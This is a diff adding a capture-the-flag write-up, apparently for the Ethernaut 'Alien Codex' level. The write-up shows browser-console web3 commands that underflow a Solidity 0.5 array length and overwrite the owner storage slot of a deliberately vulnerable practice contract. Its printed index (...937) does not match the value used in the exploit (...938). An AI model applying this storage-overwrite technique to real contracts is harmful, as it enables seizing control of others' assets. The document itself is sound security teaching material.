@@ -1500,3 +1500,161 @@ and you are done :)
 ### Learning
 
 You do not need always Solidity ;)
+
+
+## Level 19: Alien Codex <a name="level-19-alien-codex"></a>
+
+Let's have a look at the contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.0;
+
+import "../helpers/Ownable-05.sol";
+
+contract AlienCodex is Ownable {
+    bool public contact;
+    bytes32[] public codex;
+
+    modifier contacted() {
+        assert(contact);
+        _;
+    }
+
+    function makeContact() public {
+        contact = true;
+    }
+
+    function record(bytes32 _content) public contacted {
+        codex.push(_content);
+    }
+
+    function retract() public contacted {
+        codex.length--;
+    }
+
+    function revise(uint256 i, bytes32 _content) public contacted {
+        codex[i] = _content;
+    }
+}
+```
+
+Our objective is to become the owner of the contract.
+
+Important to notice is that Solidity 0.5.0 is used. Solidity allowed to modify
+length of an array, which I believe has been changed from version 6 onwards.
+
+Could this become a problem? Let's see.
+
+Let's first inspect the storage of the contract. Run the following commands
+in the browser console:
+
+```javascript
+await web3.eth.getStorageAt(contract.address, 0) // owner + contact
+await web3.eth.getStorageAt(contract.address, 1) // 
+```
+
+to verify that we mapped the variables correctly, let's call some functions
+of the contract:
+
+```javascript
+await contract.makeContact()
+await contract.record("0x000000000000000000000001f2531ff8b7ec8886ce5b48b05ab7894d25ff4bf8")
+```
+
+Let's get the storage slots again:
+    
+```javascript
+await web3.eth.getStorageAt(contract.address, 0) // owner + contact
+await web3.eth.getStorageAt(contract.address, 1) // codex
+```
+
+Storage slot 0 should now have a 1 before the owner address. That means, that the
+`contact` variable is set to true.
+Storage slot 1 should now have a 1, which represents the length of the `codex` array.
+
+Good :)
+
+Let's call the `retract` function and see what happens:
+
+```javascript
+await contract.retract()
+await web3.eth.getStorageAt(contract.address, 1) // codex should give 0
+await contract.retract()
+await web3.eth.getStorageAt(contract.address, 1) // codex should give 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+```
+Wow, what the hell. The length of the `codex` array is now `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`.
+That means we are able to write to the storage anywhere we want :O
+
+But how?
+
+For this we need to understand how the storage layout works for dynamic arrays.
+In the code we can see, that contract `owner` and `contact` are sharing slot 0,
+since both fit in there together. The length of the `codex` array is stored in
+slot 1. To get the first entry of the `codex` array, we need to calculate the
+storage slot for the first entry. The first entry is stored at `keccak256(1)`,
+where 1 is the storage slot. The second entry of the `codex` array is stored at
+`keccak256(1) + 1`, and so on.
+
+Equipped with that knowledge, we can now write to the storage of the contract
+and set the owner to our address.
+
+To see that in action, run the following commands:
+
+```javascript
+await contract.record("0xDEADBEEF")
+```
+Calculate the slot where the data is stored:
+
+```javascript
+storage_slot = web3.utils.sha3('0x0000000000000000000000000000000000000000000000000000000000000001')
+await web3.eth.getStorageAt(contract.address, storage_slot)
+```
+and you should see the data you just stored.
+
+Let's get back on how to set the owner to our address. Let's set the length of the
+array back to `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`:
+
+```javascript
+await contract.retract() // do until the length is 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+```
+
+We can see in the provided contract, that it has a `revise` function, which allows
+us to set the content of the `codex` array at a specific index. We can use that
+to set the owner to our address.
+
+We know that our array data starts at `web3.utils.sha3('0x0000000000000000000000000000000000000000000000000000000000000001')`
+and we know that the storage of a contract has `2 ** 256` slots (don't get mistaken -
+thats a really huge number). 
+Let's calculate the difference between the `(2 ** 256) - web3.utils.sha3('0x0000000000000000000000000000000000000000000000000000000000000001')`
+which will give us the index of storage slot 0.
+
+Why 0 you might ask. The storage has `2 ** 256` slots, but since we start counting
+from 0, the last slot is `2 ** 256 - 1`. `2 ** 256` is slot 0 again, overflow.
+
+Let's calculate the difference:
+
+```bash
+python3 -c 'print(0x010000000000000000000000000000000000000000000000000000000000000000 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)'
+```
+and we get a number: `35707666377435648211887908874984608119992236509074197713628505308453184860937`
+
+That's the index in order to write into slot 0.
+
+In the beginning we made the observation, that slot 0 contains the owner and the
+contact variable. Let's overwrite it now :)
+
+```javascript
+await web3.eth.getStorageAt(contract.address, 0) // to see the current value
+await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', '0x' + web3.utils.padLeft(player.replace('0x', ''), 64))
+await web3.eth.getStorageAt(contract.address, 0) // to see the new value
+await contract.owner() // you should be the owner now
+```
+
+Nice :)
+
+### Learning
+
+It is important to check which Solidity compiler is being used and what the
+differences are between the versions. Each version gets better and mitigates
+vulnerabilities/weaknesses of the previous versions.
